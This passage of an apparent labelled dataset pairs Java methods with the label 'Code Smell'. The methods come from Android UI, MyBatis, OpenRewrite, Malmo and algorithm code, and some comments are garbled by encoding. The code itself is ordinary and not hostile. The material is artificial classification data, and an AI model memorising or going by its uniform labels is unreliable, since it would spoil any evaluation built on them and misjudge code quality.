case PermissionInfo.PROTECTION_SIGNATURE_OR_SYSTEM:
case PermissionInfo.PROTECTION_SIGNATURE | PermissionInfo.PROTECTION_FLAG_PRIVILEGED:
protectionLevel=""signatureOrPrivileged"";
break;
}
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
if ((permissionFlags & PermissionInfo.PROTECTION_FLAG_PRIVILEGED) != 0) protectionLevel+=""|privileged"";
if ((permissionFlags & PermissionInfo.PROTECTION_FLAG_PRE23) != 0) protectionLevel+=""|pre23"";
if ((permissionFlags & PermissionInfo.PROTECTION_FLAG_INSTALLER) != 0) protectionLevel+=""|installer"";
if ((permissionFlags & PermissionInfo.PROTECTION_FLAG_VERIFIER) != 0) protectionLevel+=""|verifier"";
if ((permissionFlags & PermissionInfo.PROTECTION_FLAG_PREINSTALLED) != 0) protectionLevel+=""|preinstalled"";
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
if ((permissionFlags & PermissionInfo.PROTECTION_FLAG_SETUP) != 0) protectionLevel+=""|setup"";
}
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
if ((permissionFlags & PermissionInfo.PROTECTION_FLAG_RUNTIME_ONLY) != 0) protectionLevel+=""|runtime"";
}
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
if ((permissionFlags & PermissionInfo.PROTECTION_FLAG_INSTANT) != 0) protectionLevel+=""|instant"";
}
}
 else {
if ((permissionFlags & PermissionInfo.PROTECTION_FLAG_SYSTEM) != 0) {
protectionLevel+=""|system"";
}
}
if ((permissionFlags & PermissionInfo.PROTECTION_FLAG_DEVELOPMENT) != 0) {
protectionLevel+=""|development"";
}
if ((permissionFlags & PermissionInfo.PROTECTION_FLAG_APPOP) != 0) {
protectionLevel+=""|appop"";
}
return protectionLevel;
}",1,Code Smell
"@Override public String signature(@Nullable Object t){
  if (t == null) {
    return ""{undefined}"";
  }
  try {
    ASTNode astNode=(ASTNode)t;
    if (astNode instanceof ClassNode) {
      ClassNode clazz=(ClassNode)astNode;
      if (clazz.isArray()) {
        return arraySignature(clazz);
      }
 else       if (ClassHelper.isPrimitiveType(clazz)) {
        return primitiveSignature(clazz);
      }
 else       if (clazz.isUsingGenerics()) {
        return parameterizedSignature(clazz);
      }
      return classSignature(astNode);
    }
 else     if (astNode instanceof GenericsType) {
      return genericSignature(astNode);
    }
 else     if (astNode instanceof MethodNode) {
      return methodSignature((MethodNode)astNode);
    }
 else     if (astNode instanceof FieldNode) {
      return variableSignature((FieldNode)astNode);
    }
  }
 catch (  NoClassDefFoundError e) {
    return e.getMessage();
  }
  throw new UnsupportedOperationException(""Unexpected type "" + t.getClass().getName());
}
",1,Code Smell
"/** 
 * 鍖哄垎鎯呭喌澶勭悊鍗冲彲
 * @param n
 * @param m
 * @param v
 * @param val
 * @param type
 * @return
 */
public int getMaxValueOfPackageSuper(int n,int m,int[] v,int[] val,int[] type){
  int[] dp=new int[m + 1];
  for (int i=0; i < n; i++) {
    if (type[i] == -1) {
      for (int j=m; j >= v[i]; j--) {
        dp[j]=Math.max(dp[j],dp[j - v[i]] + val[i]);
      }
    }
 else     if (type[i] == 0) {
      for (int j=v[i]; j <= m; j++) {
        dp[j]=Math.max(dp[j],dp[j - v[i]] + val[i]);
      }
    }
 else {
      int num=type[i];
      for (int j=m; j >= v[i]; j--) {
        for (int k=1; k <= num && k * v[i] <= j; k++) {
          dp[j]=Math.max(dp[j],dp[j - v[i] * k] + k * val[i]);
        }
      }
    }
  }
  return dp[m];
}",1,Code Smell
"/** 
 * 鎵归噺淇濆瓨
 */
private int[] batch(SqlSessionFactory sqlSessionFactory,String sql,String columns,Collection<Map<String,Object>> entityList,int batchSize){
  int[] batch;
  SqlSession sqlSession=sqlSessionFactory.openSession(ExecutorType.BATCH);
  try {
    Connection conn=sqlSession.getConnection();
    batch=batch(conn,sql,columns,new ArrayList<>(entityList),batchSize);
    sqlSession.commit();
  }
 catch (  Throwable t) {
    log.error(""鎵归噺鎶ラ敊鍑洪敊"",t);
    sqlSession.rollback();
    Throwable unwrapped=ExceptionUtil.unwrapThrowable(t);
    if (unwrapped instanceof RuntimeException) {
      MyBatisExceptionTranslator myBatisExceptionTranslator=new MyBatisExceptionTranslator(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),true);
      throw Objects.requireNonNull(myBatisExceptionTranslator.translateExceptionIfPossible((RuntimeException)unwrapped));
    }
    throw ExceptionUtils.mpe(unwrapped);
  }
 finally {
    sqlSession.close();
  }
  return batch;
}
private int[] batch(Connection conn,String sql,String columns,List<Map<String,Object>> list,int batchSize) throws SQLException {
  if (list == null || list.size() == 0) {
    return new int[0];
  }
  if (batchSize < 1) {
    throw new IllegalArgumentException(""The batchSize must more than 0."");
  }
  String[] columnArray=columns.split("","");
  for (int i=0; i < columnArray.length; i++) {
    columnArray[i]=columnArray[i].trim();
  }
  int counter=0;
  int pointer=0;
  int size=list.size();
  int[] result=new int[size];
  PreparedStatement pst=conn.prepareStatement(sql);
  for (  Map<String,Object> map : list) {
    for (int j=0; j < columnArray.length; j++) {
      Object value=map.get(columnArray[j]);
      if (value instanceof Date) {
        if (value instanceof java.sql.Date) {
          pst.setDate(j + 1,(java.sql.Date)value);
        }
 else         if (value instanceof java.sql.Timestamp) {
          pst.setTimestamp(j + 1,(java.sql.Timestamp)value);
        }
 else {
          Date d=(Date)value;
          pst.setTimestamp(j + 1,new java.sql.Timestamp(d.getTime()));
        }
      }
 else {
        pst.setObject(j + 1,value);
      }
    }
    pst.addBatch();
    if (++counter >= batchSize) {
      counter=0;
      int[] r=pst.executeBatch();
      for (      int j : r) {
        result[pointer++]=j;
      }
    }
  }
  if (counter != 0) {
    int[] r=pst.executeBatch();
    for (    int i : r) {
      result[pointer++]=i;
    }
  }
  try {
    pst.close();
  }
 catch (  SQLException e) {
    throw new RuntimeException(e);
  }
  return result;
}",1,Code Smell
"public static Object invokeVirtualOriginal(Object obj,String name,Object... argsTypesAndReturnType) throws ReflectiveOperationException {
  Class clazz=obj.getClass();
  int argc=argsTypesAndReturnType.length / 2;
  Class[] argt=new Class[argc];
  Object[] argv=new Object[argc];
  Class returnType=null;
  if (argc * 2 + 1 == argsTypesAndReturnType.length) {
    returnType=(Class)argsTypesAndReturnType[argsTypesAndReturnType.length - 1];
  }
  int i, ii;
  Method[] m;
  Method method=null;
  Class[] _argt;
  for (i=0; i < argc; i++) {
    argt[i]=(Class)argsTypesAndReturnType[argc + i];
    argv[i]=argsTypesAndReturnType[i];
  }
  loop_main:   do {
    m=clazz.getDeclaredMethods();
    loop:     for (i=0; i < m.length; i++) {
      if (m[i].getName().equals(name)) {
        _argt=m[i].getParameterTypes();
        if (_argt.length == argt.length) {
          for (ii=0; ii < argt.length; ii++) {
            if (!argt[ii].equals(_argt[ii])) {
              continue loop;
            }
          }
          if (returnType != null && !returnType.equals(m[i].getReturnType())) {
            continue;
          }
          method=m[i];
          break loop_main;
        }
      }
    }
  }
 while (!Object.class.equals(clazz=clazz.getSuperclass()));
  if (method == null) {
    throw new NoSuchMethodException(name + "" in "" + obj.getClass().getName());
  }
  method.setAccessible(true);
  Object ret;
  boolean needPatch=false;
  try {
    ret=XposedBridge.invokeOriginalMethod(method,obj,argv);
    return ret;
  }
 catch (  IllegalStateException e) {
    needPatch=true;
  }
catch (  InvocationTargetException|NullPointerException e) {
    Throwable cause;
    if (e instanceof InvocationTargetException) {
      cause=e.getCause();
    }
 else {
      cause=e;
    }
    if (cause instanceof NullPointerException) {
      String tr=android.util.Log.getStackTraceString(cause);
      if (tr.indexOf(""ExposedBridge.invokeOriginalMethod"") != 0 || Pattern.compile(""me\\.[.a-zA-Z]+\\.invokeOriginalMethod"").matcher(tr).find()) {
        needPatch=true;
      }
    }
    if (!needPatch) {
      throw e;
    }
  }
  ret=method.invoke(obj,argv);
  return ret;
}",1,Code Smell
"public static Node listPartition2(Node head,int pivot){
  Node sH=null;
  Node sT=null;
  Node eH=null;
  Node eT=null;
  Node mH=null;
  Node mT=null;
  Node next=null;
  while (head != null) {
    next=head.next;
    head.next=null;
    if (head.value < pivot) {
      if (sH == null) {
        sH=head;
        sT=head;
      }
 else {
        sT.next=head;
        sT=head;
      }
    }
 else     if (head.value == pivot) {
      if (eH == null) {
        eH=head;
        eT=head;
      }
 else {
        eT.next=head;
        eT=head;
      }
    }
 else {
      if (mH == null) {
        mH=head;
        mT=head;
      }
 else {
        mT.next=head;
        mT=head;
      }
    }
    head=next;
  }
  if (sT != null) {
    sT.next=eH;
    eT=eT == null ? sT : eT;
  }
  if (eT != null) {
    eT.next=mH;
  }
  return sH != null ? sH : (eH != null ? eH : mH);
}",1,Code Smell
"@Override public void onItemClick(int id){
  if (id == -1) {
    if (!webViewContainer.onBackPressed()) {
      onCheckDismissByUser();
    }
  }
 else   if (id == R.id.menu_open_bot) {
    Bundle bundle=new Bundle();
    bundle.putLong(""user_id"",botId);
    parentAlert.baseFragment.presentFragment(new ChatActivity(bundle));
    parentAlert.dismiss();
  }
 else   if (id == R.id.menu_reload_page) {
    if (webViewContainer.getWebView() != null) {
      webViewContainer.getWebView().animate().cancel();
      webViewContainer.getWebView().animate().alpha(0).start();
    }
    progressView.setLoadProgress(0);
    progressView.setAlpha(1f);
    progressView.setVisibility(VISIBLE);
    webViewContainer.setBotUser(MessagesController.getInstance(currentAccount).getUser(botId));
    webViewContainer.loadFlickerAndSettingsItem(currentAccount,botId,settingsItem);
    webViewContainer.reload();
  }
 else   if (id == R.id.menu_delete_bot) {
    for (    TLRPC.TL_attachMenuBot bot : MediaDataController.getInstance(currentAccount).getAttachMenuBots().bots) {
      if (bot.bot_id == botId) {
        parentAlert.onLongClickBotButton(bot,MessagesController.getInstance(currentAccount).getUser(botId));
        break;
      }
    }
  }
 else   if (id == R.id.menu_settings) {
    webViewContainer.onSettingsButtonPressed();
  }
}",1,Code Smell
"public void animate(int startIndex,int endIndex){
  for (int i=startIndex; i < endIndex; i++) {
    CharacterAnimationState _state=charStates[i];
    if (_state == null) {
      _state=charStates[i]=new CharacterAnimationState();
    }
    CharacterAnimationState state=_state;
    int finalI=i;
    postOnAnimationDelayed(() -> {
      if (!state.colorAnimation.isRunning())       runningAnimCount++;
      state.colorAnimation.animateToFinalPosition(1f);
      if (!state.shadowAnimation.isRunning())       runningAnimCount++;
      state.shadowAnimation.animateToFinalPosition(0.3f);
      if (!state.scaleAnimation.isRunning())       runningAnimCount++;
      state.scaleAnimation.animateToFinalPosition(1.2f);
      invalidate();
      if (delayedAnimations1[finalI] != null)       removeCallbacks(delayedAnimations1[finalI]);
      if (delayedAnimations2[finalI] != null)       removeCallbacks(delayedAnimations2[finalI]);
      Runnable delay1=() -> {
        if (!state.colorAnimation.isRunning())         runningAnimCount++;
        state.colorAnimation.animateToFinalPosition(0f);
        if (!state.shadowAnimation.isRunning())         runningAnimCount++;
        state.shadowAnimation.animateToFinalPosition(0f);
        invalidate();
        delayedAnimations1[finalI]=null;
      }
;
      Runnable delay2=() -> {
        if (!state.scaleAnimation.isRunning())         runningAnimCount++;
        state.scaleAnimation.animateToFinalPosition(1f);
        delayedAnimations2[finalI]=null;
      }
;
      delayedAnimations1[finalI]=delay1;
      delayedAnimations2[finalI]=delay2;
      postOnAnimationDelayed(delay1,2000);
      postOnAnimationDelayed(delay2,100);
    }
,20L * (i - startIndex));
  }
}",1,Code Smell
"/** 
 * get valid IPV4 address from networkInterface.
 * @param networkInterface need check networkInterface
 * @param checkIp The IP address to be searched,if not specified, set to null
 * @return Search result, field 0 indicates whether it is successful,field 1 carries the matched IP value; if the checkIp is specified but not found the IP, field 1 will return the first IPV4 address
 * @throws AddressException throw exception if found no ipv4 address
 */
public static Tuple2<Boolean,String> getValidIPV4Address(NetworkInterface networkInterface,String checkIp){
  try {
    if (networkInterface == null || !networkInterface.isUp() || networkInterface.isLoopback() || ""docker0"".equals(networkInterface.getName())) {
      return new Tuple2<>(false,null);
    }
    String fstV4IP=null;
    Enumeration<InetAddress> addrs=networkInterface.getInetAddresses();
    while (addrs.hasMoreElements()) {
      InetAddress address=addrs.nextElement();
      if (address == null || address.isLoopbackAddress() || address instanceof Inet6Address) {
        continue;
      }
      String localIP=address.getHostAddress();
      if (TStringUtils.isEmpty(localIP) || localIP.startsWith(""127.0"")) {
        continue;
      }
      if (!TStringUtils.isEmpty(checkIp)) {
        if (TStringUtils.isEmpty(fstV4IP)) {
          fstV4IP=localIP;
        }
        if (localIP.equals(checkIp)) {
          return new Tuple2<>(true,localIP);
        }
        continue;
      }
      return new Tuple2<>(true,localIP);
    }
    return new Tuple2<>(false,fstV4IP);
  }
 catch (  Throwable e) {
    throw new AddressException(new StringBuilder(256).append(""Illegal parameter: "").append(""unable to obtain valid IP from network card "").append(networkInterface).toString(),e);
  }
}",1,Code Smell
"public static List<StackTraceElement> retrieveStackTrace(String startClassName){
  List<StackTraceElement> elementList=Arrays.asList(Thread.currentThread().getStackTrace());
  int startIndex=findStart(elementList,StringUtils.isBlank(startClassName) ? defaultStartClass : startClassName);
  List<StackTraceElement> result=new LinkedList<>();
  for (; startIndex < elementList.size() - 1; startIndex++) {
    String className=elementList.get(startIndex).getClassName();
    boolean add=true;
    for (    String filterClass : filterClassLists) {
      if (className.contains(filterClass)) {
        add=false;
        break;
      }
    }
    if (!add) {
      continue;
    }
    if (className.startsWith(RETRIEVE_CLASS_PREFIX)) {
      result.add(elementList.get(startIndex));
    }
  }
  result.add(elementList.get(elementList.size() - 1));
  if (result.size() > MAX_RETURN_SIZE) {
    int delCount=result.size() - MAX_RETURN_SIZE;
    ListIterator<StackTraceElement> it=result.listIterator(result.size());
    while (it.hasPrevious()) {
      it.previous();
      if (delCount <= 0) {
        break;
      }
      it.remove();
      delCount--;
    }
  }
  return result;
}",1,Code Smell
"public void run(){
  boolean running=false;
  try {
    checkHello(socket);
    while (true) {
      DataInputStream din=new DataInputStream(socket.getInputStream());
      int hdr=0;
      try {
        hdr=din.readInt();
      }
 catch (      EOFException e) {
        LogHelper.debug(""Incoming socket connection closed, likely by peer (without Exit message): "" + e);
        socket.close();
        break;
      }
      byte[] data=new byte[hdr];
      din.readFully(data);
      String command=new String(data,utf8);
      if (command.startsWith(""<StepClient"")) {
        stepClient(command,socket,din);
      }
 else       if (command.startsWith(""<StepServer"")) {
        stepServer(command,socket);
      }
 else       if (command.startsWith(""<Peek"")) {
        peek(command,socket,din);
      }
 else       if (command.startsWith(""<Init"")) {
        init(command,socket);
      }
 else       if (command.startsWith(""<Find"")) {
        find(command,socket);
      }
 else       if (command.startsWith(""<Interact"")) {
        interact(command,socket);
      }
 else       if (command.startsWith(""<MissionInit"")) {
        if (missionInit(din,command,socket)) {
          running=true;
        }
      }
 else       if (command.startsWith(""<Quit"")) {
        quit(command,socket);
        profiler.profilingEnabled=false;
      }
 else       if (command.startsWith(""<Exit"")) {
        exit(command,socket);
        profiler.profilingEnabled=false;
        return;
      }
 else       if (command.startsWith(""<Close"")) {
        close(command,socket);
        profiler.profilingEnabled=false;
      }
 else       if (command.startsWith(""<Status"")) {
        status(command,socket);
      }
 else       if (command.startsWith(""<Echo"")) {
        command=""<Echo>"" + command + ""</Echo>"";
        data=command.getBytes(utf8);
        hdr=data.length;
        DataOutputStream dout=new DataOutputStream(socket.getOutputStream());
        dout.writeInt(hdr);
        dout.write(data,0,hdr);
        dout.flush();
      }
 else       if (command.startsWith(""<Disconnect"")) {
        socket.close();
        break;
      }
 else {
        throw new IOException(""Unknown env service command: "" + command);
      }
    }
  }
 catch (  IOException ioe) {
    ioe.printStackTrace();
    TCPUtils.Log(Level.SEVERE,""MalmoEnv socket error: "" + ioe + "" (can be on disconnect)"");
    try {
      if (running) {
        TCPUtils.Log(Level.INFO,""Want to quit on disconnect."");
        System.out.println(""[LOGTOPY] "" + ""Want to quit on disconnect."");
        setWantToQuit();
      }
      socket.close();
    }
 catch (    IOException ioe2) {
    }
  }
catch (  Exception e) {
    LogHelper.error(""Error while processing commands"",e);
    try {
      socket.close();
    }
 catch (    IOException ioe2) {
    }
  }
}
public void run(){
  GuiScreen old_gui=net.minecraftforge.fml.client.FMLClientHandler.instance().getClient().currentScreen;
  net.minecraftforge.fml.client.FMLClientHandler.instance().setupServerList();
  net.minecraftforge.fml.client.FMLClientHandler.instance().connectToServer(old_gui,sd);
}",1,Code Smell
"public void toggleHidden(long dialogId,boolean hide,boolean request,boolean notify){
  ArrayList<TL_stories.PeerStories> removeFrom;
  ArrayList<TL_stories.PeerStories> insertTo;
  boolean remove=true;
  if (hide) {
    removeFrom=dialogListStories;
    insertTo=hiddenListStories;
  }
 else {
    removeFrom=hiddenListStories;
    insertTo=dialogListStories;
  }
  TL_stories.PeerStories removed=null;
  for (int i=0; i < removeFrom.size(); i++) {
    if (DialogObject.getPeerDialogId(removeFrom.get(i).peer) == dialogId) {
      if (remove) {
        removed=removeFrom.remove(i);
      }
 else {
        removed=removeFrom.get(i);
      }
      break;
    }
  }
  if (removed != null) {
    boolean found=false;
    for (int i=0; i < insertTo.size(); i++) {
      if (DialogObject.getPeerDialogId(insertTo.get(i).peer) == dialogId) {
        found=true;
        break;
      }
    }
    if (!found) {
      insertTo.add(0,removed);
      AndroidUtilities.cancelRunOnUIThread(sortStoriesRunnable);
      sortStoriesRunnable.run();
    }
  }
  if (notify) {
    NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.storiesUpdated);
  }
  MessagesController.getInstance(currentAccount).checkArchiveFolder();
  if (request) {
    if (dialogId >= 0) {
      TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(dialogId);
      user.stories_hidden=hide;
      MessagesStorage.getInstance(currentAccount).putUsersAndChats(Collections.singletonList(user),null,false,true);
      MessagesController.getInstance(currentAccount).putUser(user,false);
    }
 else {
      TLRPC.Chat chat=MessagesController.getInstance(currentAccount).getChat(-dialogId);
      chat.stories_hidden=hide;
      MessagesStorage.getInstance(currentAccount).putUsersAndChats(null,Collections.singletonList(chat),false,true);
      MessagesController.getInstance(currentAccount).putChat(chat,false);
    }
    TL_stories.TL_stories_togglePeerStoriesHidden req=new TL_stories.TL_stories_togglePeerStoriesHidden();
    req.peer=MessagesController.getInstance(currentAccount).getInputPeer(dialogId);
    req.hidden=hide;
    ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> {
    }
);
  }
}",1,Code Smell
"public static int ladderLength(String beginWord,String endWord,List<String> wordList){
  if (!wordList.contains(endWord))   return 0;
  Set<String> visited=new HashSet<>();
  Queue<String> q=new LinkedList<>();
  q.offer(beginWord);
  int length=0;
  while (!q.isEmpty()) {
    int size=q.size();
    length++;
    for (int i=0; i < size; i++) {
      String current=q.poll();
      for (int j=0; j < current.length(); j++) {
        char[] temp=current.toCharArray();
        for (char c='a'; c <= 'z'; c++) {
          temp[j]=c;
          String newWord=new String(temp);
          if (newWord.equals(endWord))           return length + 1;
          if (wordList.contains(newWord) && !visited.contains(newWord)) {
            q.offer(newWord);
            visited.add(newWord);
          }
        }
      }
    }
  }
  return 0;
}",1,Code Smell
"public static boolean deleteDirectory(File dirFile){
  if (!dirFile.exists() || !dirFile.isDirectory()) {
    return false;
  }
  boolean result;
  File[] files=dirFile.listFiles();
  if (files != null) {
    for (    File file : files) {
      if (file.isFile()) {
        result=new File(file.getAbsolutePath()).delete();
        if (!result)         return false;
      }
 else       if (file.isDirectory()) {
        result=deleteDirectory(file.getAbsolutePath());
        if (!result)         return false;
      }
    }
  }
  return dirFile.delete();
}
public static boolean deleteDirectory(String filePath){
  return deleteDirectory(new File(filePath));
}
",1,Code Smell
"@Override public void getFrame(MissionInit missionInit,ByteBuffer buffer){
  if (!this.videoParams.isWantDepth()) {
    getRGBFrame(buffer);
    return;
  }
  final int width=this.videoParams.getWidth();
  final int height=this.videoParams.getHeight();
  GL30.glBindFramebuffer(GL30.GL_READ_FRAMEBUFFER,Minecraft.getMinecraft().getFramebuffer().framebufferObject);
  GL30.glBindFramebuffer(GL30.GL_DRAW_FRAMEBUFFER,this.fbo.framebufferObject);
  GL30.glBlitFramebuffer(0,0,Minecraft.getMinecraft().getFramebuffer().framebufferWidth,Minecraft.getMinecraft().getFramebuffer().framebufferHeight,0,0,width,height,GL11.GL_COLOR_BUFFER_BIT | GL11.GL_DEPTH_BUFFER_BIT,GL11.GL_NEAREST);
  this.fbo.bindFramebuffer(true);
  glReadPixels(0,0,width,height,GL_RGBA,GL_UNSIGNED_BYTE,buffer);
  glReadPixels(0,0,width,height,GL_DEPTH_COMPONENT,GL_FLOAT,this.depthBuffer);
  this.fbo.unbindFramebuffer();
  float minval, maxval;
  if (this.videoParams.getDepthScaling() == null || this.videoParams.getDepthScaling().isAutoscale()) {
    minval=1;
    maxval=0;
    for (int i=0; i < width * height; i++) {
      float f=this.depthBuffer.get(i);
      if (f < minval)       minval=f;
      if (f > maxval)       maxval=f;
    }
  }
 else {
    minval=this.videoParams.getDepthScaling().getMin().floatValue();
    maxval=this.videoParams.getDepthScaling().getMax().floatValue();
    if (minval > maxval) {
      float t=minval;
      minval=maxval;
      maxval=t;
    }
  }
  float range=maxval - minval;
  if (range < 0.000001)   range=0.000001f;
  float scale=255 / range;
  for (int i=0; i < width * height; i++) {
    float f=this.depthBuffer.get(i);
    f=(f < minval ? minval : (f > maxval ? maxval : f));
    f-=minval;
    f*=scale;
    buffer.put(i * 4 + 3,(byte)f);
  }
  this.depthBuffer.clear();
}",1,Code Smell
"@Override public J visitMethodInvocation(J.MethodInvocation method,ExecutionContext ctx){
  J.MethodInvocation m=(J.MethodInvocation)super.visitMethodInvocation(method,ctx);
  if (!(versionMatcher.matches(m) && m.getSelect() instanceof J.MethodInvocation && pluginMatcher.matches(m.getSelect()))) {
    return m;
  }
  List<Expression> pluginArgs=((J.MethodInvocation)m.getSelect()).getArguments();
  if (!(pluginArgs.get(0) instanceof J.Literal)) {
    return m;
  }
  String pluginId=(String)((J.Literal)pluginArgs.get(0)).getValue();
  if (pluginId == null || !StringUtils.matchesGlob(pluginId,pluginIdPattern)) {
    return m;
  }
  List<Expression> versionArgs=m.getArguments();
  try {
    if (versionArgs.get(0) instanceof J.Literal) {
      String currentVersion=(String)((J.Literal)versionArgs.get(0)).getValue();
      if (currentVersion == null) {
        return m;
      }
      String resolvedVersion=new DependencyVersionSelector(null,gradleProject,gradleSettings).select(new GroupArtifactVersion(pluginId,pluginId + "".gradle.plugin"",currentVersion),""classpath"",newVersion,versionPattern,ctx);
      acc.pluginIdToNewVersion.put(pluginId,resolvedVersion);
    }
 else     if (versionArgs.get(0) instanceof G.GString) {
      G.GString gString=(G.GString)versionArgs.get(0);
      if (gString == null || gString.getStrings().isEmpty() || !(gString.getStrings().get(0) instanceof G.GString.Value)) {
        return m;
      }
      G.GString.Value gStringValue=(G.GString.Value)gString.getStrings().get(0);
      String versionVariableName=gStringValue.getTree().toString();
      String resolvedPluginVersion=new DependencyVersionSelector(null,gradleProject,gradleSettings).select(new GroupArtifact(pluginId,pluginId + "".gradle.plugin""),""classpath"",newVersion,versionPattern,ctx);
      acc.versionPropNameToPluginId.put(versionVariableName,pluginId);
      acc.pluginIdToNewVersion.put(pluginId,resolvedPluginVersion);
    }
  }
 catch (  MavenDownloadingException e) {
  }
  return m;
}
@Override public J visitMethodInvocation(J.MethodInvocation method,ExecutionContext ctx){
  J.MethodInvocation m=(J.MethodInvocation)super.visitMethodInvocation(method,ctx);
  if (!(versionMatcher.matches(m) && m.getSelect() instanceof J.MethodInvocation && pluginMatcher.matches(m.getSelect()))) {
    return m;
  }
  List<Expression> pluginArgs=((J.MethodInvocation)m.getSelect()).getArguments();
  if (!(pluginArgs.get(0) instanceof J.Literal)) {
    return m;
  }
  String pluginId=(String)((J.Literal)pluginArgs.get(0)).getValue();
  if (pluginId == null || !StringUtils.matchesGlob(pluginId,pluginIdPattern)) {
    return m;
  }
  List<Expression> versionArgs=m.getArguments();
  if (!(versionArgs.get(0) instanceof J.Literal)) {
    return m;
  }
  String currentVersion=(String)((J.Literal)versionArgs.get(0)).getValue();
  if (currentVersion == null) {
    return m;
  }
  String resolvedVersion=acc.pluginIdToNewVersion.get(pluginId);
  if (resolvedVersion == null) {
    return m;
  }
  return m.withArguments(ListUtils.map(versionArgs,v -> ChangeStringLiteral.withStringValue((J.Literal)v,resolvedVersion)));
}",1,Code Smell
"private void highlightRowInternal(RecyclerListView.IntReturnCallback callback,int removeAfter,boolean canHighlightLater){
  if (removeHighlighSelectionRunnable != null) {
    AndroidUtilities.cancelRunOnUIThread(removeHighlighSelectionRunnable);
    removeHighlighSelectionRunnable=null;
  }
  RecyclerView.ViewHolder holder=findViewHolderForAdapterPosition(callback.run());
  if (holder != null) {
    positionSelector(highlightPosition=holder.getLayoutPosition(),holder.itemView,false,-1,-1,true);
    if (selectorDrawable != null) {
      final Drawable d=selectorDrawable.getCurrent();
      if (d instanceof TransitionDrawable) {
        if (onItemLongClickListener != null || onItemClickListenerExtended != null) {
          ((TransitionDrawable)d).startTransition(ViewConfiguration.getLongPressTimeout());
        }
 else {
          ((TransitionDrawable)d).resetTransition();
        }
      }
      if (Build.VERSION.SDK_INT >= 21) {
        selectorDrawable.setHotspot(holder.itemView.getMeasuredWidth() / 2,holder.itemView.getMeasuredHeight() / 2);
      }
    }
    if (selectorDrawable != null && selectorDrawable.isStateful()) {
      if (selectorDrawable.setState(getDrawableStateForSelector())) {
        invalidateDrawable(selectorDrawable);
      }
    }
    if (removeAfter > 0) {
      pendingHighlightPosition=null;
      AndroidUtilities.runOnUIThread(removeHighlighSelectionRunnable=() -> {
        removeHighlighSelectionRunnable=null;
        pendingHighlightPosition=null;
        if (selectorDrawable != null) {
          Drawable d=selectorDrawable.getCurrent();
          if (d instanceof TransitionDrawable) {
            ((TransitionDrawable)d).resetTransition();
          }
        }
        if (selectorDrawable != null && selectorDrawable.isStateful()) {
          selectorDrawable.setState(StateSet.NOTHING);
        }
      }
,removeAfter);
    }
  }
 else   if (canHighlightLater) {
    pendingHighlightPosition=callback;
  }
}",1,Code Smell
"static NodeArray merge(NodeArray a1,NodeArray a2){
  NodeArray merged=new NodeArray(a1.size() + a2.size());
  int i=0, j=0;
  var nodesWithLastScore=new IntHashSet();
  float lastAddedScore=Float.NaN;
  while (i < a1.size() && j < a2.size()) {
    if (a1.score()[i] < a2.score[j]) {
      if (a2.score[j] != lastAddedScore) {
        nodesWithLastScore.clear();
        lastAddedScore=a2.score[j];
      }
      if (nodesWithLastScore.add(a2.node[j])) {
        merged.addInOrder(a2.node[j],a2.score[j]);
      }
      j++;
    }
 else     if (a1.score()[i] > a2.score[j]) {
      if (a1.score()[i] != lastAddedScore) {
        nodesWithLastScore.clear();
        lastAddedScore=a1.score()[i];
      }
      if (nodesWithLastScore.add(a1.node()[i])) {
        merged.addInOrder(a1.node()[i],a1.score()[i]);
      }
      i++;
    }
 else {
      if (a1.score()[i] != lastAddedScore) {
        nodesWithLastScore.clear();
        lastAddedScore=a1.score()[i];
      }
      if (nodesWithLastScore.add(a1.node()[i])) {
        merged.addInOrder(a1.node()[i],a1.score()[i]);
      }
      if (nodesWithLastScore.add(a2.node()[j])) {
        merged.addInOrder(a2.node[j],a2.score[j]);
      }
      i++;
      j++;
    }
  }
  if (i < a1.size()) {
    while (i < a1.size && a1.score()[i] == lastAddedScore) {
      if (!nodesWithLastScore.contains(a1.node()[i])) {
        merged.addInOrder(a1.node()[i],a1.score()[i]);
      }
      i++;
    }
    System.arraycopy(a1.node,i,merged.node,merged.size,a1.size - i);
    System.arraycopy(a1.score,i,merged.score,merged.size,a1.size - i);
    merged.size+=a1.size - i;
  }
  if (j < a2.size()) {
    while (j < a2.size && a2.score[j] == lastAddedScore) {
      if (!nodesWithLastScore.contains(a2.node[j])) {
        merged.addInOrder(a2.node[j],a2.score[j]);
      }
      j++;
    }
    System.arraycopy(a2.node,j,merged.node,merged.size,a2.size - j);
    System.arraycopy(a2.score,j,merged.score,merged.size,a2.size - j);
    merged.size+=a2.size - j;
  }
  return merged;
}",1,Code Smell
"@Override public TreeVisitor<?,ExecutionContext> getScanner(GradleWrapperState acc){
  return Preconditions.or(new PropertiesVisitor<ExecutionContext>(){
    @Override public boolean isAcceptable(    SourceFile sourceFile,    ExecutionContext ctx){
      if (!super.isAcceptable(sourceFile,ctx)) {
        return false;
      }
      if (equalIgnoringSeparators(sourceFile.getSourcePath(),WRAPPER_PROPERTIES_LOCATION)) {
        acc.addGradleWrapperProperties=false;
      }
 else       if (!PathUtils.matchesGlob(sourceFile.getSourcePath(),""**/"" + WRAPPER_PROPERTIES_LOCATION_RELATIVE_PATH)) {
        return false;
      }
      Optional<BuildTool> maybeBuildTool=sourceFile.getMarkers().findFirst(BuildTool.class);
      if (!maybeBuildTool.isPresent()) {
        return false;
      }
      BuildTool buildTool=maybeBuildTool.get();
      if (buildTool.getType() != BuildTool.Type.Gradle) {
        return false;
      }
      GradleWrapper gradleWrapper=getGradleWrapper(ctx);
      VersionComparator versionComparator=requireNonNull(Semver.validate(isBlank(version) ? ""latest.release"" : version,null).getValue());
      int compare=versionComparator.compare(null,buildTool.getVersion(),gradleWrapper.getVersion());
      if (compare < 0) {
        acc.needsWrapperUpdate=true;
        acc.updatedMarker=buildTool.withVersion(gradleWrapper.getVersion());
        return true;
      }
 else {
        return compare == 0;
      }
    }
    @Override public Properties visitEntry(    Properties.Entry entry,    ExecutionContext ctx){
      if (!""distributionUrl"".equals(entry.getKey())) {
        return entry;
      }
      GradleWrapper gradleWrapper=getGradleWrapper(ctx);
      String currentDistributionUrl=entry.getValue().getText();
      if (!gradleWrapper.getPropertiesFormattedUrl().equals(currentDistributionUrl)) {
        acc.needsWrapperUpdate=true;
      }
      return entry;
    }
  }
